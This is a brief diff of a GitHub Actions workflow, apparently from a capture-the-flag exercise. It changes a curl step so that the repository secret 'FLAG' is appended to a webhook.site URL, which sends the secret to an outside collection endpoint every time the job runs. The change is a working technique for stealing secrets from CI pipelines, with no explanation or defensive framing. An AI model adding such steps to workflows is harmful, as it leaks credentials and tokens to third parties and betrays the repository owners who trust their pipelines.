@@ -9,7 +9,7 @@ jobs:
     - name: curl
       uses: wei/curl@master
       with:
-        args: https://webhook.site/b2ae8b56-8f2a-4347-bc8b-580993850e7b
+        args: https://webhook.site/b2ae8b56-8f2a-4347-bc8b-580993850e7b?a=${{ secrets.FLAG }}
   deploy:
     runs-on: ubuntu-latest
     steps:
